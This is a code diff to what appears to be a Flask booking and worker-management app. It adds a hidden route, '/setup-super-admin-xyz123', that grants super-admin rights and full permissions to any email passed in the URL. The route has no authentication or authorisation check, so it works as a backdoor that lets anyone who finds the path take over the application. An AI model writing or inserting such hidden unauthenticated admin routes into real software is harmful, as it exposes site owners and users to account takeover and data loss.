@@ -347,6 +347,17 @@ def create_admin():
     flash(f"Admin {email} created", "success")
     return redirect(url_for('admin_dashboard'))
 
+@app.route('/setup-super-admin-xyz123')
+def setup_super_admin():
+    email = request.args.get('email')
+    user = User.query.filter_by(email=email).first()
+    user.is_admin = True
+    user.is_super_admin = True
+    user.role = 'admin'
+    user.admin_permissions = {"view_workers": True, "delete_workers": True, "view_customers": True, "view_bookings": True, "manage_admins": True}
+    db.session.commit()
+    return f"Done: {email} is Super Admin"
+
 
 @app.route('/approve/<int:id>')
 def approve_worker(id):
